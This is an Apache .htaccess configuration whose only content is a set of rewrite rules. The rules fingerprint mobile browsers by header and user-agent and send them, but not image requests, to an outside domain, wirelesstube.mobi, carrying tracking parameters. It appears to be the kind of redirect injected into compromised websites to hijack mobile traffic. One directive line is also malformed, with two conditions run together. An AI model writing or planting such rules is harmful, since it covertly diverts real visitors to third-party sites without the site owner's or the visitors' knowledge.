RewriteEngine On
RewriteCond %{HTTP:X-Wap-Profile} ^.+$ [OR]
RewriteCond %{HTTP:Profile}		  ^.+$ [OR]
RewriteCond %{HTTP_ACCEPT}	(text/vnd.wap.wml|application/vnd.wap.xhtml\+xml) [NC,OR]
RewriteCond %{HTTP_USER_AGENT}	(blackberry|opera mini|vantgo|blazer|elaine|hiptop|palm|plucker|xiino|kindle|mobile|mmp|midp|pocket|symbian|smartphone|treo|up.browser|up.link|vodafone|wap|sony|nokia|samsung|epoc|palm|wap1|wap2|xda-) [NC, OR]RewriteCond %{HTTP_USER_AGENT} (android|iphone|ipod|ipad) [NC]
RewriteCond %{REQUEST_URI} !\.(jpg|gif|png|jpeg|bmp)$ [NC]
RewriteRule ^(.*)$ http://www.wirelesstube.mobi/?data1=Track1&data2=Track2&sl=76750-9ff32 [L,R=302]
